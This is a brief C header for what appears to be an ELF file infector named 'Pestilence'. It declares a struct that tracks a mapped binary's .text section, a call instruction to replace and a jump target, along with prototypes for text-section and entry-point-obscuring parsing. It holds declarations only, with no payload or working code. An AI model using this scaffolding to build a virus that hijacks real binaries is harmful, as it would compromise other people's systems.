#ifndef PESTILENCE_H
# define PESTILENCE_H

# include <elf.h>
# include <unistd.h>
# include <stdlib.h>
# include <stdio.h>
# include <sys/mman.h>
# include <sys/types.h>
# include <sys/stat.h>
# include <fcntl.h>

typedef struct		s_info
{
	void		*file;
	size_t		file_size;
	void		*text_begin;
	size_t		text_size;

	void		*call_to_replace;
	void		*addr_to_jump;
}					t_info;

/*			**** PARSING ****					*/
void		find_text(t_info *info);
void		epo_parsing(t_info *info);

/*			**** LIB HANDLERS	****			*/
void		ft_memcpy(void *dest, void *src, size_t size);
void		ft_bzero(void *ptr, size_t size);

#endif
